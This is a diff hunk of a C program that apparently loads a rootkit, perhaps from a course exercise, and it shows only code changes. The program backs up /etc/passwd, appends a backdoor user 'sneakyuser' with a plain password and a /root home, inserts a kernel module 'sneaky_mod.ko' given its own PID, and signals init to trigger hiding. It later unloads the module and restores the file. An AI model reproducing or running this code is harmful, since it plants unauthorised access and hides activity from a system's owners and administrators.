@@ -8,19 +8,15 @@ int main(){
     system("cp /etc/passwd /tmp/passwd");
     system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");
 
-    char buf[100];
-    sprintf(buf, "insmod sneaky_mod.ko pid=%d", (int)getpid());
-    system(buf);
+    char str[100];
+    sprintf(str, "insmod sneaky_mod.ko pid=%d", (int)getpid());
+    system(str);
     system("kill -52 1");
 
-    char ch;
-    while (1) {
-        if ((ch = getchar()) == 'q') {
-        break;
-        }
-    }
+    char c;
+    while ((c = getchar()) != 'q') {}
     
-    system("kill -52 1");
+    system("kill -53 1");
     system("rmmod sneaky_mod");
     system("cp /tmp/passwd /etc");
     system("rm -f /tmp/passwd");
